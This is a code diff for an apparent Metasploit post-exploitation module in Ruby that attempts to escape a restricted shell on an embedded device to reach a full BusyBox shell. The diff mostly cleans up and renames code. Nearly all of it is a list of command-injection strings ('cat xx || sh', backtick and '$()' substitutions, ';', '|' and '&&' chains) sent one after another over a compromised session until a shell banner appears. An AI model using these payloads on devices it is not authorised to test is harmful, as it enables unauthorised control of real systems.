@@ -31,55 +31,38 @@ class Metasploit3 < Msf::Post
   def run
     
     bfound = false
+    bfound = try_command("cat xx || sh\n","1_1") unless bfound
+    bfound = try_command("ping || sh\n","1_2") unless bfound
+    bfound = try_command("echo `sh >> /dev/ttyp0`\n","2_1") unless bfound
+    bfound = try_command("ping `sh >> /dev/ttyp0`\n","2_2") unless bfound
+    bfound = try_command("cat `sh >> /dev/ttyp0`\n","2_3") unless bfound
+    bfound = try_command("cat xx;sh\n","3_1") unless bfound
+    bfound = try_command("echo xx;sh\n","3_2") unless bfound
+    bfound = try_command("ping;sh\n","3_3") unless bfound
+    bfound = try_command("cat xx | sh\n","4_1") unless bfound
+    bfound = try_command("ping | sh\n","4_2") unless bfound
+    bfound = try_command("cat ($sh)\n","5_1") unless bfound
+    bfound = try_command("echo ($sh) xx\n","5_2") unless bfound
+    bfound = try_command("ping ($sh)\n","5_3") unless bfound
+    bfound = try_command("cat xx &amp;&amp; sh\n","6_1") unless bfound
+    bfound = try_command("echo xx &amp;&amp; sh\n","6_2") unless bfound
+    bfound = try_command("ping &amp;&amp; sh\n","3_3") unless bfound
     
-    ############################################################method 1
-    bfound = try_command("cat xx || sh\n","1_1") if bfound == false
-    bfound = try_command("ping || sh\n","1_2") if bfound == false
-    ############################################################method 2
-    bfound = try_command("echo `sh >> /dev/ttyp0`\n","2_1") if bfound == false
-    bfound = try_command("ping `sh >> /dev/ttyp0`\n","2_2") if bfound == false
-    bfound = try_command("cat `sh >> /dev/ttyp0`\n","2_3") if bfound == false
-    ############################################################method 3    
-    bfound = try_command("cat xx;sh\n","3_1") if bfound == false
-    bfound = try_command("echo xx;sh\n","3_2") if bfound == false
-    bfound = try_command("ping;sh\n","3_3") if bfound == false
-    ############################################################method 4
-    bfound = try_command("cat xx | sh\n","4_1") if bfound == false
-    bfound = try_command("ping | sh\n","4_2") if bfound == false
-    ############################################################method 5
-    bfound = try_command("cat ($sh)\n","5_1") if bfound == false
-    bfound = try_command("echo ($sh) xx\n","5_2") if bfound == false
-    bfound = try_command("ping ($sh)\n","5_3") if bfound == false
-    ############################################################method 6
-    bfound = try_command("cat xx &amp;&amp; sh\n","6_1") if bfound == false
-    bfound = try_command("echo xx &amp;&amp; sh\n","6_2") if bfound == false
-    bfound = try_command("ping &amp;&amp; sh\n","3_3") if bfound == false
+    if bfound == false
+      print_error("Unable to jailbreak device shell")
+    end
     
   end
   
-  def try_command(paramcommand, methodnumber)
-      session.shell_write(paramcommand)
+  def try_command(param_command, method_number)
+      session.shell_write(param_command)
       resp = session.shell_read()
-      print_msg(resp)    
+      vprint_status(resp)    
       if ((resp.include? "BusyBox") && (resp.include? "Built-in shell"))
-        print_msg("Done method " + methodnumber + ".\n")
+        vprint_status("Done method " + method_number + ".")
         return true
       end  
       return false
   end
-  
-  def print_msg(msg, color=true)
-    if not @stdio
-      @stdio = Rex::Ui::Text::Output::Stdio.new
-    end
-
-    if color == true
-      @stdio.auto_color
-    else
-        @stdio.disable_color
-    end
-    @stdio.print_raw(@stdio.substitute_colors(msg))
-  end
-  
   
 end
